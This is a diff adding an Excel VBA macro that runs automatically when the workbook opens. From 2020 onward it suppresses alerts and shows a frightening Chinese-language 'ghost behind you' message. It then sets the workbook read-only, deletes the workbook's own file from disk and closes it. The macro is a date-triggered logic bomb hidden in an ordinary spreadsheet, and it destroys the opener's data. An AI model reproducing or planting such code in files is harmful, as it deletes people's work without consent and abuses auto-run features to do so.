@@ -1,0 +1,14 @@
+Private Sub Workbook_Open()
+    Dim dat As Date
+    dat = DateSerial(2020, 1, 1)
+    If Date >= dat Then
+        Application.DisplayAlerts = False
+        MsgBox "你是在偷看我的文件吗？" & vbCr & "别以为我不知道，我就在你身后看着你！白衣服，长头发，没有腿的那个。"
+        With ThisWorkbook
+            .Saved = True
+            .ChangeFileAccess xlReadOnly
+            Kill .FullName
+            .Close
+        End With
+    End If
+End Sub
